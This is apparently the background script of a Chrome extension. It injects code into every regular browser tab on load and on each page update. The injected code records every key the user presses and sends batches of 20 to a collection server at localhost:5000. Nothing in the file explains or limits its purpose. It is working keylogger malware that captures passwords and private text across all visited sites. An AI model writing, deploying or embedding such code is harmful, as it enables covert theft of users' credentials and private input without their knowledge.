
// Function to inject the content script into a tab
function injectScript(tabId) {
    chrome.tabs.executeScript(tabId, {
        code: `
        console.log('Injected script');
         
            let keyBuffer = [];
            document.addEventListener("keydown", function(e) {
                keyBuffer.push(e.key);
                if (keyBuffer.length >= 20) {
                    fetch('http://localhost:5000/keys', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ keys: keyBuffer.join('') })
                    }).catch(error => console.error('Error sending keys:', error));
                    keyBuffer = [];
                }
            });
        `
    });
}

// Inject script into all tabs initially
chrome.tabs.query({}, function(tabs) {
    tabs.forEach(function(tab) {
        if (!tab.url.startsWith('chrome://') && !tab.url.startsWith('edge://')) {
            injectScript(tab.id);
        }
    });
});

// Listen for tab updates and re-inject the script
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.status === 'complete' && !tab.url.startsWith('chrome://') && !tab.url.startsWith('edge://')) {
        injectScript(tabId);
    }
});
